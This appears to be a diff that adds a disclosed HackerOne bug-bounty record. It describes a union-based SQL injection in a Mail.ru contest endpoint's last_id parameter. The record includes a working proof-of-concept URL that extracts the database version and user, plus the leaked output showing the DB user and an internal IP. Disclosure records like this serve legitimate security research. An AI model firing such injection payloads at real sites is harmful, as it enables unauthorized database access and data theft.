@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/115291
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:15.03.2016 14:27:00
+
+Summary:
+SQL injection in out-of-scope project
+Добрый день.  GET параметр last_id уязвимо к SQL иньекции. Вектор атаки Union Based.
+
+PoC
+
+http://orsotenslimselfie.lady.mail.ru/ajax/contest?perPage=20&last_id=7913+union+select+concat(version(),0x3a,user()),2,3,4,version(),6,7,8,9,10--+
+
+вывод в JSON респонсе  - 5.0.92-community-log:healthdream@94.100.179.246
